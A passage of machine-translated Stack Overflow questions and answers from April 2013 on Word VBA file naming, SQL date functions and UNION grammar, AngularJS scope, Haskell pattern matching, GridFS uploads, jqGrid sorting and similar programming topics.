    Dim iCnt As Integer
    For Each fld In ActiveDocument.Fields
        'All this field and highlight stuff is to edit the 
        'document down--I have all this done
        If fld.Type = wdFieldFormTextInput Then iCnt = iCnt + 1
        Next
        If iCnt >= 1 Then
        Dim Response As VbMsgBoxResult
            Response = MsgBox("Delete notes and shading?", vbYesNo + vbQuestion)
              If Response = vbYes Then
                    With r.Find
                    .Highlight = True
                    .Forward = True
                    While .Execute
                    r.Delete
                    Wend
                    End With
        For Each fld In ActiveDocument.Fields
        fld.Select
            If fld.Type = wdFieldFormTextInput Then
            fld.Unlink
            End If
            Next
            With Dialogs(wdDialogFileSaveAs)
            .Name = "Burger King.Red.Y.Bea.04-10-13.Arthur Z.docm"
            .Show
            End With
            EndUndoSaver
            Exit Sub
    ElseIf Response = vbNo Then
    With Dialogs(wdDialogFileSaveAs)
    .Name = "Burger King.Red.Y.Bea.04-10-13.Arthur Z.docm"
    .Show
    End With
    End If
    EndUndoSaver
    Exit Sub
ElseIf iCnt = 0 Then
With Dialogs(wdDialogFileSaveAs)
.Name = "Burger King.Red.Y.Bea.04-10-13.Arthur Z.docm"
.Show
End With
End If
Set fld = Nothing
End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-11T13:36:11.077

这里有两个函数将为您构建文件名。您为表提供数据，GetFileName 返回您想要的字符串。

```
Public Function GetFileName(tbl As Table)

    Dim aReturn(1 To 7) As String
    Dim vaName2 As Variant

    aReturn(1) = CleanString(tbl.Cell(2, 2).Range.Text)
    aReturn(2) = CleanString(tbl.Cell(3, 2).Range.Text)
    vaName2 = Split(tbl.Cell(3, 1).Range.Text, Space(1))
    On Error Resume Next
        aReturn(3) = CleanString(vaName2(1))
    On Error GoTo 0
    aReturn(4) = CleanString(vaName2(0))
    aReturn(5) = Format(CleanString(tbl.Cell(1, 1).Range.Text), "mm-dd-yy")
    aReturn(6) = CleanString(tbl.Cell(2, 1).Range.Text)
    aReturn(7) = "txt"

    GetFileName = Join(aReturn, ".")

End Function

Public Function CleanString(ByVal sText As String)

    CleanString = Replace(Replace(sText, Chr$(7), vbNullString), vbCr, vbNullString)

End Function 
```

可能有更好的方法可以将文本从表格中删除，但这就是我所拥有的。用你的桌子，你得到

```
?getfilename(thisdocument.Tables(1))
Burger King.Red.Y.Bea.04-10-13.Arthur Z.txt 
```

我不确定你怎么知道要使用哪个表，但我想你知道。您只需将结果存储在一个变量中，并在现在硬编码的任何地方使用该变量。

**在代码中使用**

将上面的代码粘贴到标准模块中。我无法从您的问题中看出哪个表包含构建文件名所需的信息，因此我假设它是本示例文档中的第一个表。声明一个变量来保存文件名。

```
Dim sFileName As String 
```

在您需要文件名之前，在代码中的某个位置生成文件名并将其存储在变量中。

```
sFileName = GetFileName(ActiveDocument.Tables(1)) 
```

然后，无论您在哪里硬编码了名称，都使用该变量。

```
With Dialogs(wdDialogFileSaveAs)
   .Name = sFileName 
```

# sybase - Sybase Advantage 数据库服务器和 DATEPART

> ID：15936484
> 
> 赞同：4
> 
> 时间：2013-04-10T21:10:28.320
> 
> 标签：sybase, advantage-database-server, datepart

我正在寻找使用 DATEPART 查询 Sybase Advantage 数据库服务器。我收到一条错误消息，指出以下“未找到标量函数：datepart”。是否有另一个具有类似功能的功能？我正在寻找约会的季度。我们目前正在运行 9.0 版。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-03-02T16:50:35.737

当然，我会在发布后立即找到答案...要专门查找季度，您可以使用函数 QUARTER( *date* )。

[http://devzone.advantagedatabase.com/dz/webhelp/advantage9.0/supported_statements/date_time_functions.htm](http://devzone.advantagedatabase.com/dz/webhelp/advantage9.0/supported_statements/date_time_functions.htm)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-27T17:11:50.317

您可以使用 QUARTER(date) 来满足您的需要。

[在这里](http://devzone.advantagedatabase.com/dz/webhelp/advantage9.0/supported_statements/date_time_functions.htm)查看更多信息。

# jquery - 必需的 Doctype 属性

> ID：15936489
> 
> 赞同：1
> 
> 时间：2013-04-10T21:11:04.000
> 
> 标签：jquery, html

我有一个文档类型的页面：

`<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">`

我正在尝试在使用 IE8 测试的页面上运行 jQuery 动画。动画不起作用，即使触发了“动画完成”回调，也不会尝试动画。

如果我将文档类型更改为：

`<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">`

动画效果完美。该添加的 URL 是必要的还是必需的？

编辑：我应该补充一点，我无法控制原始页面的 HTML。我只是将这个 doctype 放到一个测试页面中，看看这是否是问题所在。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:17:47.617

您引用的 URL 指向您的文档使用的定义；[有几个选项](http://www.w3.org/TR/html401/struct/global.html#h-7.2)。

您很可能在 Quirks 模式（使 IE8 的行为类似于 IE5.5）和标准模式之间遇到问题。如果您按 F12，您应该能够通过开发人员工具识别您所处的文档模式。

有几种方法可以让浏览器回到标准模式：

*   在 HTTP 响应中发送`x-ua-compatible`一个值为 的标头。`IE=edge`
*   使用较短的`<!DOCTYPE html>`文档类型
*   或使用`meta`标签提供`x-ua-compatible`说明

除此之外，如果您无法修改标记，您将无法强制页面进入标准。当然，您可以通过在开发人员工具中手动覆盖文档模式来体验标准模式；但这不会影响任何其他用户。

补充阅读：

*   [定义文档兼容性](http://msdn.microsoft.com/en-us/library/cc288325%28v=vs.85%29.aspx)
*   [调查文档模式问题](http://msdn.microsoft.com/en-us/library/gg699340%28v=vs.85%29.aspx)

# sitecore - 在 ECM 2.0 中看不到按钮

> ID：15936490
> 
> 赞同：0
> 
> 时间：2013-04-10T21:11:10.637
> 
> 标签：sitecore, sitecore6, sitecore-ecm

刚刚全新安装了 Sitecore 6.6 rev 130214（更新 4）和 DMS，然后安装了 ECM 2.0。（首先安装 SPEAK 作为 ECM 的一部分）

当我导航到活动管理器时，我意识到我看不到按钮图像。例如，“确定”、“返回”、“保存”、“取消”等。

使用 IE 的“开发人员工具”，我可以看到按钮应该使用 PIE 呈现，但我就是看不到它们。

我能看到它们的唯一方法是单击并按住按钮应该在的位置，然后拖出按钮并释放。看起来它可能正在显示按钮的“向下”状态。（灰色的）

我正在使用 IE8。（我知道，但这是我的客户端使用的，我正在我的客户端开发机器上安装新的浏览器以查看它是否是 IE 问题）在兼容模式下是 IE8 还是 IE8 似乎并不重要。

界面看起来很漂亮，只是我看不到全部。:)

有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-11T05:15:53.587

据我记得ECM 2.0 不支持IE8。它适用于 IE9。尝试在 ECM 文档中查找支持的浏览器列表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-11T11:09:56.100

按照[伊万](https://stackoverflow.com/users/550070/ivan-korshun)的说法，

1.  建议您阅读 SDN 上的[IE 配置指南](http://sdn.sitecore.net/upload/sitecore6/sc62keywords/configure_internet_explorer_sc62_a4.pdf)。
2.  您可能还必须安装 Adob​​e Flash 和/或 Silverlight。[此处](http://www.microsoft.com/getsilverlight/Get-Started/Install/Default.aspx)提供 Silverlight 兼容性。
3.  最后还可以阅读 Sitecore CMS 和 DMS 6.6.0 rev 的[发行说明](http://sdn.sitecore.net/Products/Sitecore%20V5/Sitecore%20CMS%206/ReleaseNotes/ChangeLog/Release%20History%20SC66.aspx)。130214（6.6.0 更新 4）。有趣的是，没有明确提及 IE8，但它突出了 IE9 面临的问题（如果有的话）。

让我们知道这是否有帮助。一切顺利。

# ios - 如何使用 Xcodebuild 运行 Xcode 测试

> ID：15936494
> 
> 赞同：2
> 
> 时间：2013-04-10T21:11:30.717
> 
> 标签：ios, xcode, xcodebuild

我在我的单元测试包类型项目中添加了一个新目标，并添加了一些测试用例。

我可以从 Xcode 中运行它，但我不知道如何从命令行运行它，以便我可以将它添加为 CI 构建系统的一部分。

我知道应用程序测试不能在 Xcode 环境之外执行，但这些不是应用程序测试而是逻辑测试。

每当我尝试运行任何 xcodebuild 命令时，即使是一个干净的命令，它都会返回说该方案未配置为运行。并没有 - 在管理方案部分，只有测试复选框被勾选，但即使在勾选运行复选框后，我仍然会收到同样的错误。

实际上我不确定我是否应该是：a）执行主项目的方案，并将测试部分*设置为我新创建的测试目标（*我不知道这个词 - 通过“部分”我表示在管理方案部分中，可以选择执行 Build|Run|Test|Profile|Analyse|Archive。) b) 创建一个新方案只是为了运行测试。

我在 Xcode 中尝试了两种方法，并且两种方法都有效，但是无论我尝试使用 XCodebuild 做什么，我总是会收到一些错误消息。

# mysql - mysql 按日期之间的距离排序

> ID：15936501
> 
> 赞同：1
> 
> 时间：2013-04-10T21:11:42.017
> 
> 标签：mysql

我有以下问题，我有一张表格，上面有*课程*、发布日期和更新日期。我需要在过去或将来获取更接近某个日期更新的*课程。*所以我试图做类似的事情：

`select * from mytable sort by (difference_between_dates)`

**difference_between_dates**将是**update_date**和**我正在寻找的日期**之间的时间。那可能吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:14:10.257

看[`DATEDIFF()`](https://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_datediff)

```
SELECT *
FROM mytable
ORDER BY DATEDIFF(update_date, "2013-04-10") 
```

也许将它包装在一个[`ABS()`](http://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html#function_abs)如果未来与过去无关紧要的情况中。

# svg - 裁剪 SVG 以删除周围的空白

> ID：15936503
> 
> 赞同：3
> 
> 时间：2013-04-10T21:11:48.370
> 
> 标签：svg, adobe, crop, vector-graphics, adobe-bridge

我有一组 SVG，它们是通过获取相应的 PNG 集合生成的，在 Adob​​e Bridge 中实时跟踪它们，将它们保存为 AI，然后使用 Adob​​e 的内置脚本将这些 AI 文件转换为 SVG。

SVG 中的形状结果很好——然而，在这个过程中的某个地方，在图像的侧面添加了一堆额外的填充。更准确地说，它本身的 height 和 width 属性以及 viewBox 的尺寸都比它们包含的形状大得多。

是否有任何解决方案（从 .svg 中的字符串替换到花哨的 Adob​​e 脚本）来自动设置 viewBox 的尺寸仅适合形状，或者裁剪 SVG 以达到相同的效果？

我是 SVG 新手，如果有其他信息可能有用，请告诉我。

谢谢

# uibutton - 带有背景图像的 UIButton：标题文本随机不出现

> ID：15936504
> 
> 赞同：0
> 
> 时间：2013-04-10T21:11:47.943
> 
> 标签：uibutton, uikit

我在具有标题文本的 UIButton 上设置背景图像。这工作正常，除了大约 5% 的时间，很少且不确定地，使用相同的代码，文本不会出现。

在我的 UIButton 子类中：

```
[self setBackgroundImage:normalImage forState:UIControlStateNormal];
// Also set a background image for all other states. 
```

在 UIButton 类别中，我有这个方便的方法来设置标题：

```
- (void)setNormalTitle:(NSString *)title {
    [self setTitle:title forState:UIControlStateNormal];
    [self setTitle:title forState:UIControlStateSelected];
    [self setTitle:title forState:UIControlStateHighlighted];
    [self setTitle:title forState:UIControlStateSelected | UIControlStateHighlighted];
} 
```

我没有发现任何人遇到过这个问题。有任何想法吗？我总是可以创建一个自定义 UIView，其中包含按钮并使用 UILabel 在顶部绘制文本，但我想知道我在这里是否遇到了一个已知问题。

**更新**：我似乎通过异步设置标题来解决这个问题：

```
_tabCell = loadTopNibObject(@"MYTabSmall3HeaderCell");
dispatch_async(dispatch_get_main_queue(), ^{
    _tabCell.tab0Button.normalTitle = @"Option 1";
    _tabCell.tab1Button.normalTitle = @"Option 2";
    _tabCell.tab2Button.normalTitle = @"Option 3";
}); 
```

**更新 2**：不，以上不起作用。我已经设置断点并打印出空按钮的文本，即使按钮显示为空白，它也会报告正确的字符串。我也尝试`setNeedsDisplay:`在触摸按钮时运行，但无济于事。还尝试在触摸时将按钮文本重新设置为某个特定的字符串（例如`@"test"`），但这不会引起任何可见的让步。

# sql - 标准 SQL 是否允许对联合表达式进行分组？

> ID：15936507
> 
> 赞同：1
> 
> 时间：2013-04-10T21:12:01.567
> 
> 标签：sql, union, language-lawyer, operator-precedence, parentheses

我看了看 SQL-92 标准，然后看了看有人整理的 SQL-92 语法，但看不懂。

正如[SQL Server 文档](http://msdn.microsoft.com/en-us/library/ms191141%28v=sql.105%29.aspx "SQL Server 文档")提醒我们的那样，在某些情况下，表达式应该被显式分组：

> 默认情况下，SQL Server 2005 从左到右计算包含 UNION 运算符的语句。使用括号指定评估顺序。例如，以下语句不等价：

```
/* First statement. */
SELECT * FROM TableA
UNION ALL
(   SELECT * FROM TableB
   UNION
   SELECT * FROM TableC
)
GO

/* Second statement. */
(SELECT * FROM TableA
 UNION ALL
 SELECT * FROM TableB
)
UNION
SELECT * FROM TableC)
GO 
```

> 在第一个语句中，在 TableB 和 TableC 之间的联合中消除了重复项。在该集合和 TableA 之间的联合中，不会消除重复项。在第二个语句中，重复项包含在 TableA 和 TableB 之间的联合中，但在随后与 TableC 的联合中被消除。ALL 对这个表达式的最终结果没有影响。

但我发现 MySQL 和 SqlLite 不支持它（供参考，Oracle、SQL Server、Postgres 和 DB2 支持。）

那么如何检查规格是否允许呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T21:28:52.443

摘自[SQL-92 语法](http://savage.net.au/SQL/sql-92.bnf.html)，摘自 SQL-92 标准并带有超链接：

```
<direct select statement: multiple rows>    ::=   <query expression> [ <order by clause> ]

<query expression>    ::=   <non-join query expression> | <joined table>

<non-join query expression>    ::= 
         <non-join query term>
     |     <query expression>  UNION  [  ALL  ] [ <corresponding spec> ] <query term>
     |     <query expression>  EXCEPT  [  ALL  ] [ <corresponding spec> ] <query term>

<joined table>    ::= 
         <cross join>
     | <qualified join>
     | <left paren> <joined table> <right paren>

<non-join query term>    ::= 
         <non-join query primary>
     |     <query term>  INTERSECT  [  ALL  ] [ <corresponding spec> ] <query primary>

<query term>    ::=   <non-join query term> | <joined table>

<cross join>    ::= 
         <table reference>  CROSS  JOIN <table reference>

<qualified join>    ::= 
         <table reference> [  NATURAL  ] [ <join type> ]  JOIN <table reference> [ <join specification> ]

<non-join query primary>    ::=   <simple table> | <left paren> <non-join query expression> <right paren>

<query primary>    ::=   <non-join query primary> | <joined table>

<table reference>    ::= 
         <table name> [ <correlation specification> ]
     | <derived table> <correlation specification>
     | <joined table>

<simple table>    ::= 
         <query specification>
     |     <table value constructor>
     |     <explicit table>

<query specification>    ::= 
          SELECT  [ <set quantifier> ] <select list> <table expression>

<table expression>    ::= 
         <from clause>
         [ <where clause> ]
         [ <group by clause> ]
         [ <having clause> ] 
```

<direct select statement: multiple rows> 是我们将要匹配的规则。我们检查

`SELECT * FROM p`匹配 <query specification>、<simple table>、<non-join query primary>、<non-join query term>、<non-join query expression>、<query expression>

`SELECT * FROM p UNION SELECT * FROM q`匹配 <非连接查询表达式>

`(SELECT * FROM p UNION SELECT * FROM q)`匹配 <non-join query primary>、<non-join query term>、<non-join query expression>、<query expression>

`(SELECT * FROM p UNION SELECT * FROM q) UNION SELECT * FROM r`现在匹配 <non-join query expression> 和 <query expression>。

因此它匹配 <direct select statement: multiple rows>，因此它是一个有效的 SQL-92 语句。

类似地，`SELECT * FROM p UNION (SELECT * FROM q UNION SELECT * FROM r)`、`(SELECT * FROM p)`和`(SELECT * FROM p UNION SELECT * FROM q)`even`p CROSS JOIN q`是有效的 SQL-92 选择语句。

# angularjs - Angular - 在 ngInclude 中调用时 ngModel 不更新

> ID：15936509
> 
> 赞同：18
> 
> 时间：2013-04-10T21:12:09.317
> 
> 标签：angularjs, angularjs-scope, angular-ngmodel

首先，plunker：[http ://plnkr.co/edit/v1uTz5](http://plnkr.co/edit/v1uTz5)

这是我遇到的问题的工作演示。

我必须`ng-include`包括一个部分。

在部分内部，我有一个带有`ngModel`AND 指令的文本输入。

模型在包含内相应地更新，但包含外的任何交互都将被忽略。包含的`{{test}}`外部不会更新，但`{{test}}`内部会更新。

该指令在调用时处理`enter`键并调用正确的范围和函数。但是，该`$scope.test`变量从未被更新，而是`$scope.testFinal`被更新并且`ng-include`模板适当地呈现它。尝试重置`$scope.test`模型也不起作用。

我在这里错过了什么吗？或者这是指令或`ng-include`?

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2013-04-10T21:56:40.640

不要使用原语来定义变量，而是让它成为一个对象。

```
$scope.model={test:''}; 
```

指令为每个项目创建自己的范围。当您将原语等同于新的范围变量时，它与原始变量没有绑定，但是当原始变量是对象时，将创建引用，而不是副本，并且在其中所做的更改将反映在另一个中

简单的解释性示例：

```
var a ='foo';
var b= a;
/* now change a*/
a='bar';
alert( b) // is still 'foo' 
```

现在对对象做同样的事情：

```
var obj_1= {a:'foo'};
var obj_2=obj_1;
/* now change obj_1.a*/
obj_1.a='bar';
alert( obj_2.a) // change to obj_1 will also change obj_2 and alert returns "bar"*/ 
```

[您的 Plunker 已修改](http://plnkr.co/edit/1PVHZ1?p=preview)

[阅读有关 angular wiki 的这篇文章以获得更详细的解释](https://github.com/angular/angular.js/wiki/The-Nuances-of-Scope-Prototypal-Inheritance)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-08-13T22:56:27.413

John Lindquist 有一个关于它的[视频。](http://www.youtube.com/watch?v=DTx23w4z6Kc&list=PLP6DbQBkn9ymGQh2qpk9ImLHdSH5T7yw7)尽管他并没有完全解释为什么你需要使用一个对象。

基本上每次有一个新的非隔离作用域时，父作用域的每个属性都会被复制到新作用域，正如@charlietfl 解释的那样，复制原始类型**确实**会创建一个“副本”，但是对于对象，你得到的是一个参考，因此变化是*全局*的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-06-22T08:20:40.717

`ng-include`创建自己的范围，它与外部范围不同。使用`this.test`而不是`$scope.test`内部`ng-include`模板。它会正常工作。

# c++ - 如何使用Loadstring加载汉字

> ID：15936513
> 
> 赞同：0
> 
> 时间：2013-04-10T21:12:22.067
> 
> 标签：c++, arrays, string, unicode, wchar

我有一个字符串表，它定义了一个中文字符串，如下所示：

```
STRINGTABLE
    LANGAUGE 0x0C04, 0x03
BEGIN
    1000    "检查环境..."
    ...
END 
```

我正在尝试将该字符串加载到 wchar_t 缓冲区中，如下所示：

```
#define UNICODE
#define _UNICODE
wchar_t buffer[512];
LoadString(DLL_HANDLE, (UINT) msg_num, buffer, 512);
MessageBox(NULL, buffer, NULL, NULL); 
```

但是，加载到缓冲区中的字符串与我的字符串表中的字符串不同。

在我的字符串表中看起来像这样：

```
检查环境... 
```

但这就是它在屏幕上的结果：

```
ç’°å¢ƒã‚’ãƒã‚§ãƒƒã‚¯ä¸­... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T08:09:45.097

MSDN 文档指出格式应类似于 `IDS_CHINESESTRING L"\x5e2e\x52a9"`. 这不是最正式的描述。我将其解释为说明 unicode 字符串必须以转义码为前缀`L`并使用`\uxxxx`转义码进行编码

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T23:06:36.167

~~'MessageBox' 功能是否默认适用于窄字符串？你不需要使用'MessageBoxW'吗？~~

编辑：

有几件事要检查。L"..." 字符串的编码是实现定义的。该标准没有提及 ; 字符的编码`wchar_t`。确保您使用的编码与 Windows 预期的相同。（如果我没记错的话，windows 需要 UTF-16 - 但我很可能是错的）。

在 C++11 中，引入了 3 种新的文字字符串类型，它们的前缀是“u8”、“u”和“U”，分别指定 UTF-8、UTF-16 和 UTF-32。除了第 2.14.3 节中提到的内容外，C++11 仍然不保证对“L”前缀的编码做出任何保证：

```
A character literal that begins with the letter L, such as L’x’, is a wide-character literal. A wide-character
literal has type wchar_t.23 The value of a wide-character literal containing a single c-char has value equal
to the numerical value of the encoding of the c-char in the execution wide-character set, unless the c-char
has no representation in the execution wide-character set, in which case the value is implementation-defined.
[ Note: The type wchar_t is able to represent all members of the execution wide-character set (see 3.9.1).
—end note ]. The value of a wide-character literal containing multiple c-chars is implementation-defined. 
```

参考§3.9.1 P5 状态：

```
Type wchar_t is a distinct type whose values can represent distinct codes for all members of the largest
extended character set specified among the supported locales (22.3.1). Type wchar_t shall have the same
size, signedness, and alignment requirements (3.11) as one of the other integral types, called its underlying
type. Types char16_t and char32_t denote distinct types with the same size, signedness, and alignment as
uint_least16_t and uint_least32_t, respectively, in <stdint.h>, called the underlying types. 
```

同样，没有提到编码。Windows 可能期望与您的资源字符串使用的编码不同，因此存在差异。

您可以通过使用带有“\Uxxxxxxx”编码转义符的 L"" 字符串文字调用 MessageBox 来验证您的字符。

# php - 需要一些指南来在 OOP 概念中重构我的 php 代码

> ID：15936518
> 
> 赞同：0
> 
> 时间：2013-04-10T21:12:27.697
> 
> 标签：php, oop

我写了一个运行良好的 wordpress 插件。然而，它只是工作，但这里没有 OOP，因为当时有必要尽快构建一些东西。我阅读了一些文献，发现由于菱形问题，php不支持多重继承。

**当前情景：**

```
Flickr
--pic importer
----1\. sql.php
----2\. javascript.php
----3\. call to show database contents

--photoset importer
----1\. sql.php
----2\. javascript.php
----3\. call to show database contents 
```

在这里，我创建了 2 个类：`picImporter`和`photosetImporter`. `1\. sql.php`这两个类共享来自 (和) 的共同内容，`2\. javascript.php`但第 3 点（*显示数据库内容*的实现对它们不同）。

**所以，我的想法是：**我应该创建另一个类，`Global`并且类应该扩展这个类。在 Global 类中应该有一个子类必须定义的抽象类。于是设计变成了：`photosetImporter``picImporter`

```
Class Global{
   //$sql comes sql.php,
   //$javacript comes javascript.php,
   abstract protected function showDatabaseContents();
}

Class picImporter extends Global{
    protected function showDatabaseContents() {
        //implementation using **$sql** from base
    }
}

Class photosetImporter extends Global{
    protected function showDatabaseContents() {
        //implementation using **$javascript** from base
    }
} 
```

在我继续之前，我只想知道我是否在正确的轨道上，如果可能的话进一步指导。

谢谢，-S。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:43:02.577

没有特别的“正确”方式来做你正在寻找的事情（尽管有错误的方式）。如果不了解您的 javascript 类的功能，很难知道我会使用什么方法。

通常，我创建一个全局 DB 抽象类（我假设您的 sql 类是），然后在需要的地方从全局范围访问它。全局范围并不是邪恶的，特别是对于数据库访问之类的东西，它们不是您正在创建的任何其他类所固有的，但几乎在任何地方都需要。您的 javascript 类可能也是如此。

也就是说，如果您需要这种抽象来在应用程序中保持一致的设计，那么我认为您在这里所做的没有问题，这似乎是一种合乎逻辑的方法。

如果您正在寻找可能是最佳实践的方法，请搜索“PHP 设计模式”，但总的来说，我使用 PHP 的方法是使其简单易用。这可能意味着使用设计模式，或者可能意味着更基本的方法，具体取决于。

# mysql - 来自邮政编码的mysql城市名称

> ID：15936520
> 
> 赞同：0
> 
> 时间：2013-04-10T21:12:34.217
> 
> 标签：mysql, join

我正在尝试从 mysql 数据库中获取有关用户的一些信息。我有一个包含用户名、生日、profiletext、邮政编码等列的用户表，然后我有一个名为城市的表，其中包含一个邮政编码列和一个 city_name 列。

我想做的是从邮政编码中获取用户的城市名称。

查询现在看起来像这样：

```
$sql = ('
    SELECT
    username,
    birthdate,
    TIMESTAMPDIFF(YEAR,birthdate,CURDATE()) AS age,
    profile_text,

    FROM users
    WHERE id = ?
'); 
```

我自己的猜测是我应该使用某种连接，但我也不确定。

希望可以有人帮帮我。

先感谢您！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:16:25.063

这是你要找的sql吗？

```
SELECT
    users.username,
    users.birthdate,
    TIMESTAMPDIFF(YEAR,users.birthdate,CURDATE()) AS age,
    users.profile_text,
    cities.city_name,
    cities.postalcode
FROM users, cities
    WHERE id = ? and cities.postalcode = users.postalcode 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:17:21.740

这是一个相当简单的连接......我没有你的确切字段，但是像这样：

```
SELECT
    u.username,
    u.birthdate,
    TIMESTAMPDIFF(YEAR,u.birthdate,CURDATE()) AS age,
    u.profile_text,
    c.city

FROM users u, cities c
WHERE u.id = ? 
    and c.postal_code = u.postal_code 
```

# haskell - 将图表更改为 Haskell 中的节点列表

> ID：15936521
> 
> 赞同：0
> 
> 时间：2013-04-10T21:12:42.500
> 
> 标签：haskell, graph

我有这些数据类型：

```
data Node a = Node
    { label :: a,
        adjacent :: [(a,Int)] } deriving Show
data Network a = Graph [Node a] deriving Show 
```

我想将图表转换为节点列表。例如我想把这个：

```
Graph [ ( Node 'a' [ ( 'b' , 3 ) , ( 'c' ,2 ) ] ) , ( Node 'b' [ ('c' , 3 ) ] ) , ( Node 'c' [] ) ] 
```

对此：

```
[ ( Node 'a' [ ( 'b' , 3 ) , ( 'c' ,2 ) ] ) , ( Node 'b' [ ('c' , 3 ) ] ) , ( Node 'c' [] ) ] 
```

我写了这个函数和它的一些其他变体：

```
deGraph Graph [Node x y] = [Node x y] 
```

但我不断出错。你能告诉我应该如何改变我的功能吗？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:16:27.767

您误解了如何在列表上进行模式匹配。

```
foo [x] = x 
```

匹配单个元素的列表并将该元素绑定到 x。

由于您希望它与所有列表匹配，因此您可以执行类似的操作

```
foo xs = xs 
```

所以你的代码应该改为

```
deGraph (Graph nodes) = nodes
-- Notice the fact that I wrapped the constructor
-- in parens 
```

包起来：

为了明确起见，以下是您可以在列表中匹配的不同方式

```
 -- matches on individual elements (this is syntactic sugary goodness)
foo [x, y] = x
 -- grabs the head and tail of the list (This is actual deconstructing)
foo (x:rest) = x
 -- matches an empty list
foo []       = error "Oh noes"
 -- matches everything
foo xs       = head xs 
```

或以上任意组合。

# node.js - MongoDB（Node.js 原生驱动）大型 gridfs 上传失败

> ID：15936523
> 
> 赞同：1
> 
> 时间：2013-04-10T21:12:43.720
> 
> 标签：node.js, mongodb

当我尝试将大文件（1.8GB）上传到GridFS时，Mongodb似乎任意提前返回。较小的文件工作得很好。

我正在使用 node.js 本机驱动程序。代码（为简洁起见省略了一些内容）如下：

```
var objectId = new ObjectID(),
gridStore = new GridStore(db, objectId, filename /*declared elsewhere*/, "w", { "content_type": contentType /* declared elsewhere */ }), 
obj = {};

gridStore.open(function (err, gs) {
    console.log("gridStore open");
    gs.writeFile(tempFile, function (err, doc) {
        if (err) {
            throw err;
        }

        console.log("file written");
            obj.fileId = doc._id;

        // double check the md5 of the uploaded file against what was uploaded
                // (md5 variable declared elsewhere)
        if (doc.md5 !== md5) {
            console.log(doc);
            console.log(doc.md5);
            console.log(md5);
            //delete bad file
            GridStore.unlink(db, doc.filename, function (err, gridStore) {
                if (err) {
                    throw err;
                }
            });

        } else {
            // do the desired stuff
        }
    });
}); 
```

“doc”对象似乎总是以不同的长度返回（显然是不同的 md5）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-21T14:53:23.340

这个问题显然与 Node 的流实现的早期版本有关。10Gen 的 Node 驱动程序团队编写了新版本的驱动程序以使用更新的 Node 流实现。因此，Node 和本机客户端驱动程序的升级解决了这个问题。

# jqgrid - jqGrid 文本排序顺序

> ID：15936527
> 
> 赞同：0
> 
> 时间：2013-04-10T21:12:50.563
> 
> 标签：jqgrid

我有一个像这样设置的 jqGrid

```
gridAltMpn.jqGrid({ 
  autowidth: true,
  shrinkToFit: true,
  datatype : 'local', 
  data : input, 
  height : '100',
  scrollrows: true,
  scrollOffset : '0', 
  hidegrid : false,
  colNames : [ 'P', 'MPN' ],
  colModel : [ 
     { name : 'Col1', width : 30, align:'center' }, 
     { name : 'Col2', width : 250, sorttype: 'integer'} 
  ],
  pager : '#altmpn_pager', 
  pagerpos : 'left', 
  scroll: 50,
  gridview : true, 
  caption : 'A useful table title',
  emptyRecordText : '<div id="no_data_msg" style="text-align:center"> No Results Found</div>', 
  hoverrows : true,      
  onSelectRow: function(id) {
     var gsr = gridAltMpn.jqGrid('getGridParam', 'selrow');
     if (gsr) {
        var rowData = gridAltMpn.jqGrid('getRowData', gsr);
        if ($("input[name='optInvInqType']:checked").val() == 'MPN') {
           getInvInq("MPN", rowData.MPN);
        }
     }
  },
  loadComplete: function() { 
     gridAltMpn.setSelection(gridAltMpn.getDataIDs()[0], true); 
  }
}); 
```

此网格中的数据如下所示

```
XX 774860A6                   
   774860A8                   
   774860A4                   
   774860A3                   
   774860A10                  
   STARTER, PNEUM,PW4000 
```

当第一次加载网格时它很好但是如果用户想按第二列排序它最终会像这样

```
 774860A10                  
   774860A3                   
   774860A4                   
XX 774860A6                   
   774860A8                   
   STARTER, PNEUM,PW4000 
```

774860A10 应该在 774860A8 之后，就像在整数排序中一样。我不能使用整数排序，因为它们不是整数，因为那里有一些字母字符。换句话说，我希望文本条目像整数一样排序。我是否需要使用自定义排序例程，然后让我的 Javascript 执行类似排序的整数？我也不需要第一次排序，因为我的服务器按第一列排序。用户可能希望它按第二列排序

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T04:26:11.693

您应该为这种类型的排序使用自定义函数。

为此，将 jqgrid 的排序类型属性设置为您的自定义函数。如[该链接](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:colmodel_options)中所述，排序类型可以具有以下值。

```
sorttype:

int/integer - for sorting integer
float/number/currency - for sorting decimal numbers
date - for sorting date
text - for text sorting
function - defines a custom function for sorting. To this function we pass the value to be sorted and it should return a value too. 
```

并且自定义函数可以是这样的：（来自Oleg 在[这个问题的答案中找到的](https://stackoverflow.com/questions/3324613/jqgrid-with-custom-sorttype)[这个链接](http://www.trirand.com/blog/?page_id=393/help/custom-local-sort-with-respect-of-the-function-as-index/)。）

```
 colModel: [

{name:'Posn', index:'Posn', width:100, sorttype:

function(cell)

{
//Here you have to apply your own logic
if (cell=='GK') return '0';//returns the sort order 

if (cell=='DEF') return '1';

if (cell=='MID') return '2';

if (cell=='STR') return '3';

}

}, 
```

顺便说一句，您可以设置`sortname`jqgrid 的属性来设置一个列用于初始加载时间排序。

